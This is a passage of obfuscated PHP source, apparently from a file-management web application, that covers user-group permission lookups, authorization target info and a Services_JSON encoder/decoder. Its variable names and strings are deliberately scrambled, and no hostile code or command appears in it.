$FÆµ³ïˆ‘ = $this->groupStepToUserGroup($c†ÇùŒÆ–×, $cÉ´µÚÎ´«); if ($FÆµ³ïˆ‘ < $CÃ¿‚É‹¼ñ) { $CÃ¿‚É‹¼ñ = $FÆµ³ïˆ‘; $F†Ãêã¼¨÷ = $CÓíƒŒæ‹; $b¨Êë—Å£ = $fƒİ·ªÓ ; $fä¨¦ìÕ©Î = $c†ÇùŒÆ–×; } if ($FÆµ³ïˆ‘ == $CÃ¿‚É‹¼ñ && $CÓíƒŒæ‹ >= $F†Ãêã¼¨÷) { $F†Ãêã¼¨÷ = $CÓíƒŒæ‹; $b¨Êë—Å£ = $fƒİ·ªÓ ; $fä¨¦ìÕ©Î = $c†ÇùŒÆ–×; } } else { if ($c†ÇùŒÆ–× == $aäÁŒ©†áˆ[473]) { $Dù”áâºó¥ = !0; $C£ÖÄ¦¼‰… = $fƒİ·ªÓ ; $b†½‡×ºà = $CÓíƒŒæ‹; } } } } if ($F¤Û…ŠŠ) { $Cº ºÄÇ™â = $B÷ªÒ´¹ç; $fƒİ·ªÓ  = $fƒäùî£ğŒ; $B··ê…„‘ï = LNG($aäÁŒ©†áˆ[2315]); } else { if ($EøÆ×Ñà) { $Cº ºÄÇ™â = $F†Ãêã¼¨÷; $fƒİ·ªÓ  = $b¨Êë—Å£; $D¶¤Äºôˆª = Model($aäÁŒ©†áˆ[463])->getInfo($fä¨¦ìÕ©Î); $B··ê…„‘ï = $aäÁŒ©†áˆ[157] . $D¶¤Äºôˆª[$aäÁŒ©†áˆ[468]] . $aäÁŒ©†áˆ[2316] . LNG($aäÁŒ©†áˆ[2317]); } else { if ($Dù”áâºó¥) { $Cº ºÄÇ™â = $b†½‡×ºà; $fƒİ·ªÓ  = $C£ÖÄ¦¼‰…; $B··ê…„‘ï = LNG($aäÁŒ©†áˆ[2287]); } else { $Cº ºÄÇ™â = 0; $fƒİ·ªÓ  = !1; $B··ê…„‘ï = $aäÁŒ©†áˆ[33]; } } } $AÍÏÜ†¨ø = array($aäÁŒ©†áˆ[2308] => intval($Cº ºÄÇ™â), $aäÁŒ©†áˆ[2291] => $fƒİ·ªÓ , $aäÁŒ©†áˆ[2309] => $B··ê…„‘ï, $aäÁŒ©†áˆ[2300] => $this->sourceAuthInfo($Eƒ³Ï²ĞÈ°[$aäÁŒ©†áˆ[373]])); goto aëÅ²¿æŒƒ; E¥¡Õ…Ü¿ù: $F¤Û…ŠŠ = 0; $B÷ªÒ´¹ç = 0; $fƒäùî£ğŒ = 0; goto Fäø¡â¤Úƒ; A…’ç¦¥†ö: $aäÁŒ©†áˆ =& $_SERVER[…Ò×–]; if (!$A¶²¼Í·Œ) { return array($aäÁŒ©†áˆ[381] => 0, $aäÁŒ©†áˆ[422] => !1); } $cÉ´µÚÎ´« = $cÉ´µÚÎ´« ? $cÉ´µÚÎ´« : USER_ID; goto E¥¡Õ…Ü¿ù; aëÅ²¿æŒƒ: return $AÍÏÜ†¨ø; goto c¼©»ìØ¡; Fäø¡â¤Úƒ: $EøÆ×Ñà = 0; $F†Ãêã¼¨÷ = 0; $b¨Êë—Å£ = 0; goto AÙóÉ‡èÕ­; eØÆ“À–Œ¡: $b†½‡×ºà = 0; $C£ÖÄ¦¼‰… = 0; $Eƒ³Ï²ĞÈ° = array($aäÁŒ©†áˆ[373] => 0); goto eÏÕâ‚æÆö; AÙóÉ‡èÕ­: $CÃ¿‚É‹¼ñ = 1000; $fä¨¦ìÕ©Î = 0; $Dù”áâºó¥ = 0; goto eØÆ“À–Œ¡; c¼©»ìØ¡: } private function groupContainUser($E¹ê‘¼‹á, $Bïï–ÁŠ = false) { return in_array($E¹ê‘¼‹á, $this->userGroupParents($Bïï–ÁŠ)); } private function groupStepToUserGroup($e¾ëÀ‘•İ, $eÀËØÂ§½‹ = false) { goto F¥…·Ò–Ğ; CÀï®ÕˆİŠ: return $e¨«÷ÀšÎ”; goto FçÇÑğ‡˜’; bÙÁ´¨ÍÂ¤: $b¾ƒù…¥ = $GLOBALS[$Bšì‹ï÷íƒ[6]][$Bšì‹ï÷íƒ[84]][$Bšì‹ï÷íƒ[2210]] == 1; $F¯éàˆéÑ™ = $b¾ƒù…¥ ? 3 : 2; foreach ($DÙÉÓ‘©å as $Eº»Éñôå•) { if ($Eº»Éñôå•[$Bšì‹ï÷íƒ[2119]] == $e¾ëÀ‘•İ) { return 0; } $dì¼ĞöÜŸí = explode($Bšì‹ï÷íƒ[47], trim($Eº»Éñôå•[$Bšì‹ï÷íƒ[464]], $Bšì‹ï÷íƒ[47])); if ($dì¼ĞöÜŸí[0] == $Bšì‹ï÷íƒ[473] && count($dì¼ĞöÜŸí) > $F¯éàˆéÑ™) { $FØÀ¬â©·† = array_reverse(array_slice($dì¼ĞöÜŸí, $F¯éàˆéÑ™)); $a©Ú¢‚Úëî = array_search($e¾ëÀ‘•İ, $FØÀ¬â©·†); if ($a©Ú¢‚Úëî !== !1 && $a©Ú¢‚Úëî + 1 <= $e¨«÷ÀšÎ”) { $e¨«÷ÀšÎ” = $a©Ú¢‚Úëî + 1; } } } goto CÀï®ÕˆİŠ; F¥…·Ò–Ğ: $Bšì‹ï÷íƒ =& $_SERVER[…Ò×–]; $DÙÉÓ‘©å = $this->userGroupList($eÀËØÂ§½‹); $e¨«÷ÀšÎ” = 1000; goto bÙÁ´¨ÍÂ¤; FçÇÑğ‡˜’: } private function userGroupList($cñ“ìĞİ·± = false) { $C•í‰Ûà =& $_SERVER[…Ò×–]; static $eÎ×É‡„ê« = array(); if (isset($eÎ×É‡„ê«[$cñ“ìĞİ·±])) { return $eÎ×É‡„ê«[$cñ“ìĞİ·±]; } $Cò—Ü˜“…‹ = Model($C•í‰Ûà[482])->getInfo($cñ“ìĞİ·±); $eÎ×É‡„ê«[$cñ“ìĞİ·±] = array_to_keyvalue($Cò—Ü˜“…‹[$C•í‰Ûà[2288]], $C•í‰Ûà[2119]); return $eÎ×É‡„ê«[$cñ“ìĞİ·±]; } public function userGroupParents($E–¹®•µ…Û) { goto c»ÛÓÅ¥‚«; BÖÊÙÖƒ¸: $d¹¸”Úô¬Õ = $GLOBALS[$f©¯†ßÒÔğ[6]][$f©¯†ßÒÔğ[84]][$f©¯†ßÒÔğ[2210]] == 1; $c¿è½½ìãÎ = $d¹¸”Úô¬Õ ? 3 : 2; foreach ($D¼ Í±†ƒ³ as $dåéã‘§¯ç) { $E•‰‘³¯Ú = array($dåéã‘§¯ç[$f©¯†ßÒÔğ[2119]]); $Eò¥Ô÷õ¼¨ = explode($f©¯†ßÒÔğ[47], trim($dåéã‘§¯ç[$f©¯†ßÒÔğ[464]], $f©¯†ßÒÔğ[47])); if ($Eò¥Ô÷õ¼¨[0] == $f©¯†ßÒÔğ[473] && count($Eò¥Ô÷õ¼¨) > $c¿è½½ìãÎ) { $e¸ãÖŠó = array_slice($Eò¥Ô÷õ¼¨, $c¿è½½ìãÎ); $E•‰‘³¯Ú = array_merge($E•‰‘³¯Ú, array_reverse($e¸ãÖŠó)); } $d‚âğŒ¶ˆ™ = array_merge($d‚âğŒ¶ˆ™, $E•‰‘³¯Ú); } goto f³»”·µœÜ; f³»”·µœÜ: $f·´»—é¢¸[$E–¹®•µ…Û] = array_unique($d‚âğŒ¶ˆ™); return $f·´»—é¢¸[$E–¹®•µ…Û]; goto AßÓ£éÖª²; e†è×æÈì: if (isset($f·´»—é¢¸[$E–¹®•µ…Û])) { return $f·´»—é¢¸[$E–¹®•µ…Û]; } $D¼ Í±†ƒ³ = $this->userGroupList($E–¹®•µ…Û); $d‚âğŒ¶ˆ™ = array(); goto BÖÊÙÖƒ¸; c»ÛÓÅ¥‚«: $f©¯†ßÒÔğ =& $_SERVER[…Ò×–]; static $f·´»—é¢¸ = array(); $E–¹®•µ…Û = $E–¹®•µ…Û ? $E–¹®•µ…Û : USER_ID; goto e†è×æÈì; AßÓ£éÖª²: } public function authTargetInfoMake($d„ÔçŠ…ØÔ) { goto AôÙêõ¥µñ; AôÙêõ¥µñ: $d”»ê¼²Š° =& $_SERVER[…Ò×–]; $D˜ÌÅ–«ù = array(); $dµ¤Ì®Œ± = array(); goto F»ß¯Èï; fÒ¹‹Éñ·Ş: return array($d”»ê¼²Š°[2318] => $D˜ÌÅ–«ù, $d”»ê¼²Š°[2319] => $dµ¤Ì®Œ±); goto A”‘ù§ˆçŠ; F»ß¯Èï: foreach ($d„ÔçŠ…ØÔ as $cßªÁÆÎ¸) { if ($cßªÁÆÎ¸[$d”»ê¼²Š°[375]] == SourceModel::TYPE_USER) { $D˜ÌÅ–«ù[] = intval($cßªÁÆÎ¸[$d”»ê¼²Š°[461]]); } else { if ($cßªÁÆÎ¸[$d”»ê¼²Š°[375]] == SourceModel::TYPE_GROUP) { $dµ¤Ì®Œ±[] = intval($cßªÁÆÎ¸[$d”»ê¼²Š°[461]]); } } } if ($D˜ÌÅ–«ù) { $D˜ÌÅ–«ù = Model($d”»ê¼²Š°[479])->userListInfo($D˜ÌÅ–«ù); } if ($dµ¤Ì®Œ±) { $F†œ…Ï§Ë¹ = array($d”»ê¼²Š°[2196] => array($d”»ê¼²Š°[388], $dµ¤Ì®Œ±)); $dµ¤Ì®Œ± = Model($d”»ê¼²Š°[463])->field($d”»ê¼²Š°[2209])->where($F†œ…Ï§Ë¹)->select(); $dµ¤Ì®Œ± = array_to_keyvalue($dµ¤Ì®Œ±, $d”»ê¼²Š°[2119]); } goto fÒ¹‹Éñ·Ş; A”‘ù§ˆçŠ: } public function authInfo($dµ—…ğøî) { $A„²°âßéÄ =& $_SERVER[…Ò×–]; if ($dµ—…ğøî[$A„²°âßéÄ[2263]]) { $CËœÙÒß¾å = Model($A„²°âßéÄ[2282])->listData($dµ—…ğøî[$A„²°âßéÄ[2263]]); if (!$CËœÙÒß¾å) { return !1; $BÁŒ‚Éã°… = Model($A„²°âßéÄ[2282])->listData(); $cËÙëÉ×„ò = array_filter_by_field($BÁŒ‚Éã°…, $A„²°âßéÄ[380], $A„²°âßéÄ[473]); return $cËÙëÉ×„ò; } $B¡âœ¹ŒÀŒ = array_field_key($CËœÙÒß¾å, array($A„²°âßéÄ[371], $A„²°âßéÄ[28], $A„²°âßéÄ[380], $A„²°âßéÄ[2139], $A„²°âßéÄ[2141])); $B¡âœ¹ŒÀŒ[$A„²°âßéÄ[2320]] = $dµ—…ğøî; return $B¡âœ¹ŒÀŒ; } else { return array($A„²°âßéÄ[389] => 0, $A„²°âßéÄ[2125] => $dµ—…ğøî[$A„²°âßéÄ[2264]], $A„²°âßéÄ[390] => $A„²°âßéÄ[33], $A„²°âßéÄ[2139] => $A„²°âßéÄ[2321]); } } } goto B‡ò»Ş ¥ò; aİ«õİšÛÚ: define($_SERVER[…Ò×–][1951], 16); define($_SERVER[…Ò×–][1952], 32); class Services_JSON { function __construct($Fèá½Ùóñ™ = 0) { $this->use = $Fèá½Ùóñ™; } function utf162utf8($c¼­Œ”’¿Ø) { $Aá•ÚİÃ´µ =& $_SERVER[…Ò×–]; if (function_exists($Aá•ÚİÃ´µ[68])) { return mb_convert_encoding($c¼­Œ”’¿Ø, $Aá•ÚİÃ´µ[1601], $Aá•ÚİÃ´µ[1953]); } $FìÇô°Óª = ord($c¼­Œ”’¿Ø[0]) << 8 | ord($c¼­Œ”’¿Ø[1]); switch (!0) { case (127 & $FìÇô°Óª) == $FìÇô°Óª: return chr(127 & $FìÇô°Óª); case (2047 & $FìÇô°Óª) == $FìÇô°Óª: return chr(192 | $FìÇô°Óª >> 6 & 31) . chr(128 | $FìÇô°Óª & 63); case (65535 & $FìÇô°Óª) == $FìÇô°Óª: return chr(224 | $FìÇô°Óª >> 12 & 15) . chr(128 | $FìÇô°Óª >> 6 & 63) . chr(128 | $FìÇô°Óª & 63); } return $Aá•ÚİÃ´µ[33]; } function utf82utf16($D²¶ø¹öÃö) { $CÑëÈÎóö =& $_SERVER[…Ò×–]; if (function_exists($CÑëÈÎóö[68])) { return mb_convert_encoding($D²¶ø¹öÃö, $CÑëÈÎóö[1953], $CÑëÈÎóö[1601]); } switch (strlen($D²¶ø¹öÃö)) { case 1: return $D²¶ø¹öÃö; case 2: return chr(7 & ord($D²¶ø¹öÃö[0]) >> 2) . chr(192 & ord($D²¶ø¹öÃö[0]) << 6 | 63 & ord($D²¶ø¹öÃö[1])); case 3: return chr(240 & ord($D²¶ø¹öÃö[0]) << 4 | 15 & ord($D²¶ø¹öÃö[1]) >> 2) . chr(192 & ord($D²¶ø¹öÃö[1]) << 6 | 127 & ord($D²¶ø¹öÃö[2])); } return $CÑëÈÎóö[33]; } function encode($BÄ¾Å¥ì”Á) { $D»ÕËÀÒ =& $_SERVER[…Ò×–]; switch (gettype($BÄ¾Å¥ì”Á)) { case $D»ÕËÀÒ[1612]: return $BÄ¾Å¥ì”Á ? $D»ÕËÀÒ[1611] : $D»ÕËÀÒ[1613]; case $D»ÕËÀÒ[1954]: return $D»ÕËÀÒ[99]; case $D»ÕËÀÒ[307]: return (int) $BÄ¾Å¥ì”Á; case $D»ÕËÀÒ[282]: case $D»ÕËÀÒ[281]: return (double) $BÄ¾Å¥ì”Á; case $D»ÕËÀÒ[316]: $b°«‰‹Ùª = $D»ÕËÀÒ[33]; $eéØ¼èœ = strlen($BÄ¾Å¥ì”Á); for ($b«Õ¼™©Ù† = 0; $b«Õ¼™©Ù† < $eéØ¼èœ; ++$b«Õ¼™©Ù†) { $f‡Û›šè’º = ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù†]); switch (!0) { case $f‡Û›šè’º == 8: $b°«‰‹Ùª .= $D»ÕËÀÒ[1955]; break; case $f‡Û›šè’º == 9: $b°«‰‹Ùª .= $D»ÕËÀÒ[1588]; break; case $f‡Û›šè’º == 10: $b°«‰‹Ùª .= $D»ÕËÀÒ[1586]; break; case $f‡Û›šè’º == 12: $b°«‰‹Ùª .= $D»ÕËÀÒ[1956]; break; case $f‡Û›šè’º == 13: $b°«‰‹Ùª .= $D»ÕËÀÒ[1587]; break; case $f‡Û›šè’º == 34: case $f‡Û›šè’º == 47: case $f‡Û›šè’º == 92: $b°«‰‹Ùª .= $D»ÕËÀÒ[93] . $BÄ¾Å¥ì”Á[$b«Õ¼™©Ù†]; break; case $f‡Û›šè’º >= 32 && $f‡Û›šè’º <= 127: $b°«‰‹Ùª .= $BÄ¾Å¥ì”Á[$b«Õ¼™©Ù†]; break; case ($f‡Û›šè’º & 224) == 192: $E•Û‡äÊê = pack($D»ÕËÀÒ[1957], $f‡Û›šè’º, ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 1])); $b«Õ¼™©Ù† += 1; $F¿‚¾ã®Ñ¨ = $this->utf82utf16($E•Û‡äÊê); $b°«‰‹Ùª .= sprintf($D»ÕËÀÒ[1958], bin2hex($F¿‚¾ã®Ñ¨)); break; case ($f‡Û›šè’º & 240) == 224: $E•Û‡äÊê = pack($D»ÕËÀÒ[1957], $f‡Û›šè’º, ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 1]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 2])); $b«Õ¼™©Ù† += 2; $F¿‚¾ã®Ñ¨ = $this->utf82utf16($E•Û‡äÊê); $b°«‰‹Ùª .= sprintf($D»ÕËÀÒ[1958], bin2hex($F¿‚¾ã®Ñ¨)); break; case ($f‡Û›šè’º & 248) == 240: $E•Û‡äÊê = pack($D»ÕËÀÒ[1957], $f‡Û›šè’º, ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 1]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 2]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 3])); $b«Õ¼™©Ù† += 3; $F¿‚¾ã®Ñ¨ = $this->utf82utf16($E•Û‡äÊê); $b°«‰‹Ùª .= sprintf($D»ÕËÀÒ[1958], bin2hex($F¿‚¾ã®Ñ¨)); break; case ($f‡Û›šè’º & 252) == 248: $E•Û‡äÊê = pack($D»ÕËÀÒ[1957], $f‡Û›šè’º, ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 1]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 2]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 3]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 4])); $b«Õ¼™©Ù† += 4; $F¿‚¾ã®Ñ¨ = $this->utf82utf16($E•Û‡äÊê); $b°«‰‹Ùª .= sprintf($D»ÕËÀÒ[1958], bin2hex($F¿‚¾ã®Ñ¨)); break; case ($f‡Û›šè’º & 254) == 252: $E•Û‡äÊê = pack($D»ÕËÀÒ[1957], $f‡Û›šè’º, ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 1]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 2]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 3]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 4]), ord($BÄ¾Å¥ì”Á[$b«Õ¼™©Ù† + 5])); $b«Õ¼™©Ù† += 5; $F¿‚¾ã®Ñ¨ = $this->utf82utf16($E•Û‡äÊê); $b°«‰‹Ùª .= sprintf($D»ÕËÀÒ[1958], bin2hex($F¿‚¾ã®Ñ¨)); break; } } return $D»ÕËÀÒ[113] . $b°«‰‹Ùª . $D»ÕËÀÒ[113]; case $D»ÕËÀÒ[1959]: if (is_array($BÄ¾Å¥ì”Á) && count($BÄ¾Å¥ì”Á) && array_keys($BÄ¾Å¥ì”Á) !== range(0, sizeof($BÄ¾Å¥ì”Á) - 1)) { $B‚ÓÚóÛøÒ = array_map(array($this, $D»ÕËÀÒ[1960]), array_keys($BÄ¾Å¥ì”Á), array_values($BÄ¾Å¥ì”Á)); foreach ($B‚ÓÚóÛøÒ as $F‘î¢“î§Ù) { if (Services_JSON::isError($F‘î¢“î§Ù)) { return $F‘î¢“î§Ù; } } return $D»ÕËÀÒ[1078] . join($D»ÕËÀÒ[47], $B‚ÓÚóÛøÒ) . $D»ÕËÀÒ[319]; } $c¬›æÖªæ„ = array_map(array($this, $D»ÕËÀÒ[1961]), $BÄ¾Å¥ì”Á); foreach ($c¬›æÖªæ„ as $Dï‰‹œ¯¡) { if (Services_JSON::isError($Dï‰‹œ¯¡)) { return $Dï‰‹œ¯¡; } } return $D»ÕËÀÒ[157] . join($D»ÕËÀÒ[47], $c¬›æÖªæ„) . $D»ÕËÀÒ[481]; case $D»ÕËÀÒ[1962]: $a…½Ø°ŒÒ = get_object_vars($BÄ¾Å¥ì”Á); $B‚ÓÚóÛøÒ = array_map(array($this, $D»ÕËÀÒ[1960]), array_keys($a…½Ø°ŒÒ), array_values($a…½Ø°ŒÒ)); foreach ($B‚ÓÚóÛøÒ as $F‘î¢“î§Ù) { if (Services_JSON::isError($F‘î¢“î§Ù)) { return $F‘î¢“î§Ù; } } return $D»ÕËÀÒ[1078] . join($D»ÕËÀÒ[47], $B‚ÓÚóÛøÒ) . $D»ÕËÀÒ[319]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $D»ÕËÀÒ[99] : new Services_JSON_Error(gettype($BÄ¾Å¥ì”Á) . $D»ÕËÀÒ[1963]); } } function name_value($E¹ÔœÃâ·Š, $BÁÜ™Õ²ä) { $AŒ¡ò¯åÌİ = $this->encode($BÁÜ™Õ²ä); if (Services_JSON::isError($AŒ¡ò¯åÌİ)) { return $AŒ¡ò¯åÌİ; } return $this->encode(strval($E¹ÔœÃâ·Š)) . $_SERVER[…Ò×–][4] . $AŒ¡ò¯åÌİ; } function reduce_string($aä´»¼æå) { $aöó‰‘ÚßÖ =& $_SERVER[…Ò×–]; $aä´»¼æå = preg_replace(array($aöó‰‘ÚßÖ[1964], $aöó‰‘ÚßÖ[1965], $aöó‰‘ÚßÖ[1966]), $aöó‰‘ÚßÖ[33], $aä´»¼æå); return trim($aä´»¼æå); } function decode($AÏŒÌÎ×Ä) { $Aéè¨İçíÓ =& $_SERVER[…Ò×–]; $AÏŒÌÎ×Ä = $this->reduce_string($AÏŒÌÎ×Ä); switch (strtolower($AÏŒÌÎ×Ä)) { case $Aéè¨İçíÓ[1611]: return !0; case $Aéè¨İçíÓ[1613]: return !1; case $Aéè¨İçíÓ[99]: return null; default: $aİ¡Íçˆ·¤ = array(); if (is_numeric($AÏŒÌÎ×Ä)) { return (double) $AÏŒÌÎ×Ä == (int) $AÏŒÌÎ×Ä ? (int) $AÏŒÌÎ×Ä : (double) $AÏŒÌÎ×Ä; } elseif (preg_match($Aéè¨İçíÓ[1967], $AÏŒÌÎ×Ä, $aİ¡Íçˆ·¤) && $aİ¡Íçˆ·¤[1] == $aİ¡Íçˆ·¤[2]) { $EŸ‹ïĞ·”´ = substr($AÏŒÌÎ×Ä, 0, 1); $dœÚÏÜš–— = substr($AÏŒÌÎ×Ä, 1, -1); $BÁŸøÎÙì = $Aéè¨İçíÓ[33]; $F•·âè¶°ñ = strlen($dœÚÏÜš–—); for ($B÷­Ì®‘‡ = 0; $B÷­Ì®‘‡ < $F•·âè¶°ñ; ++$B÷­Ì®‘‡) { $dÁÇáÖ„ìÀ = substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 2); $a‡Š’Ññ™ = ord($dœÚÏÜš–—[$B÷­Ì®‘‡]); switch (!0) { case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1955]: $BÁŸøÎÙì .= chr(8); ++$B÷­Ì®‘‡; break; case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1588]: $BÁŸøÎÙì .= chr(9); ++$B÷­Ì®‘‡; break; case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1586]: $BÁŸøÎÙì .= chr(10); ++$B÷­Ì®‘‡; break; case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1956]: $BÁŸøÎÙì .= chr(12); ++$B÷­Ì®‘‡; break; case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1587]: $BÁŸøÎÙì .= chr(13); ++$B÷­Ì®‘‡; break; case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1368]: case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1968]: case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1581]: case $dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1583]: if ($EŸ‹ïĞ·”´ == $Aéè¨İçíÓ[113] && $dÁÇáÖ„ìÀ != $Aéè¨İçíÓ[1968] || $EŸ‹ïĞ·”´ == $Aéè¨İçíÓ[55] && $dÁÇáÖ„ìÀ != $Aéè¨İçíÓ[1368]) { $BÁŸøÎÙì .= $dœÚÏÜš–—[++$B÷­Ì®‘‡]; } break; case preg_match($Aéè¨İçíÓ[1969], substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 6)): $d£¯øƒß = chr(hexdec(substr($dœÚÏÜš–—, $B÷­Ì®‘‡ + 2, 2))) . chr(hexdec(substr($dœÚÏÜš–—, $B÷­Ì®‘‡ + 4, 2))); $BÁŸøÎÙì .= $this->utf162utf8($d£¯øƒß); $B÷­Ì®‘‡ += 5; break; case $a‡Š’Ññ™ >= 32 && $a‡Š’Ññ™ <= 127: $BÁŸøÎÙì .= $dœÚÏÜš–—[$B÷­Ì®‘‡]; break; case ($a‡Š’Ññ™ & 224) == 192: $BÁŸøÎÙì .= substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 2); ++$B÷­Ì®‘‡; break; case ($a‡Š’Ññ™ & 240) == 224: $BÁŸøÎÙì .= substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 3); $B÷­Ì®‘‡ += 2; break; case ($a‡Š’Ññ™ & 248) == 240: $BÁŸøÎÙì .= substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 4); $B÷­Ì®‘‡ += 3; break; case ($a‡Š’Ññ™ & 252) == 248: $BÁŸøÎÙì .= substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 5); $B÷­Ì®‘‡ += 4; break; case ($a‡Š’Ññ™ & 254) == 252: $BÁŸøÎÙì .= substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 6); $B÷­Ì®‘‡ += 5; break; } } return $BÁŸøÎÙì; } elseif (preg_match($Aéè¨İçíÓ[1970], $AÏŒÌÎ×Ä) || preg_match($Aéè¨İçíÓ[1971], $AÏŒÌÎ×Ä)) { goto A™‘äÄğÔ; bï ˆõ½˜: $dœÚÏÜš–— = $this->reduce_string($dœÚÏÜš–—); if ($dœÚÏÜš–— == $Aéè¨İçíÓ[33]) { if (reset($Dœ×Í—òˆ) == SERVICES_JSON_IN_ARR) { return $cô¿’Ğ’ßï; } else { return $f¢Ÿ¾ÃŒø‹; } } $F•·âè¶°ñ = strlen($dœÚÏÜš–—); goto F»ÕÛ³¤ã£; F»ÕÛ³¤ã£: for ($B÷­Ì®‘‡ = 0; $B÷­Ì®‘‡ <= $F•·âè¶°ñ; ++$B÷­Ì®‘‡) { $c«ÎÌ …ñâ = end($Dœ×Í—òˆ); $dÁÇáÖ„ìÀ = substr($dœÚÏÜš–—, $B÷­Ì®‘‡, 2); if ($B÷­Ì®‘‡ == $F•·âè¶°ñ || $dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[47] && $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]] == SERVICES_JSON_SLICE) { $f×ÒÉç¡·  = substr($dœÚÏÜš–—, $c«ÎÌ …ñâ[$Aéè¨İçíÓ[267]], $B÷­Ì®‘‡ - $c«ÎÌ …ñâ[$Aéè¨İçíÓ[267]]); array_push($Dœ×Í—òˆ, array($Aéè¨İçíÓ[1972] => SERVICES_JSON_SLICE, $Aéè¨İçíÓ[267] => $B÷­Ì®‘‡ + 1, $Aéè¨İçíÓ[1973] => !1)); if (reset($Dœ×Í—òˆ) == SERVICES_JSON_IN_ARR) { array_push($cô¿’Ğ’ßï, $this->decode($f×ÒÉç¡· )); } elseif (reset($Dœ×Í—òˆ) == SERVICES_JSON_IN_OBJ) { $C ©ÍÀ©Â‡ = array(); if (preg_match($Aéè¨İçíÓ[1974], $f×ÒÉç¡· , $C ©ÍÀ©Â‡)) { $F­ĞöæÄÇ = $this->decode($C ©ÍÀ©Â‡[1]); $CÅ©Òñ·” = $this->decode($C ©ÍÀ©Â‡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f¢Ÿ¾ÃŒø‹[$F­ĞöæÄÇ] = $CÅ©Òñ·”; } else { $f¢Ÿ¾ÃŒø‹->{$F­ĞöæÄÇ} = $CÅ©Òñ·”; } } elseif (preg_match($Aéè¨İçíÓ[1975], $f×ÒÉç¡· , $C ©ÍÀ©Â‡)) { $F­ĞöæÄÇ = $C ©ÍÀ©Â‡[1]; $CÅ©Òñ·” = $this->decode($C ©ÍÀ©Â‡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f¢Ÿ¾ÃŒø‹[$F­ĞöæÄÇ] = $CÅ©Òñ·”; } else { $f¢Ÿ¾ÃŒø‹->{$F­ĞöæÄÇ} = $CÅ©Òñ·”; } } } } elseif (($dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[113] || $dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[55]) && $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]] != SERVICES_JSON_IN_STR) { array_push($Dœ×Í—òˆ, array($Aéè¨İçíÓ[1972] => SERVICES_JSON_IN_STR, $Aéè¨İçíÓ[267] => $B÷­Ì®‘‡, $Aéè¨İçíÓ[1973] => $dœÚÏÜš–—[$B÷­Ì®‘‡])); } elseif ($dœÚÏÜš–—[$B÷­Ì®‘‡] == $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1973]] && $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]] == SERVICES_JSON_IN_STR && (strlen(substr($dœÚÏÜš–—, 0, $B÷­Ì®‘‡)) - strlen(rtrim(substr($dœÚÏÜš–—, 0, $B÷­Ì®‘‡), $Aéè¨İçíÓ[93]))) % 2 != 1) { array_pop($Dœ×Í—òˆ); } elseif ($dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[157] && in_array($c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Dœ×Í—òˆ, array($Aéè¨İçíÓ[1972] => SERVICES_JSON_IN_ARR, $Aéè¨İçíÓ[267] => $B÷­Ì®‘‡, $Aéè¨İçíÓ[1973] => !1)); } elseif ($dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[481] && $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]] == SERVICES_JSON_IN_ARR) { array_pop($Dœ×Í—òˆ); } elseif ($dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[1078] && in_array($c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Dœ×Í—òˆ, array($Aéè¨İçíÓ[1972] => SERVICES_JSON_IN_OBJ, $Aéè¨İçíÓ[267] => $B÷­Ì®‘‡, $Aéè¨İçíÓ[1973] => !1)); } elseif ($dœÚÏÜš–—[$B÷­Ì®‘‡] == $Aéè¨İçíÓ[319] && $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]] == SERVICES_JSON_IN_OBJ) { array_pop($Dœ×Í—òˆ); } elseif ($dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1976] && in_array($c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]], 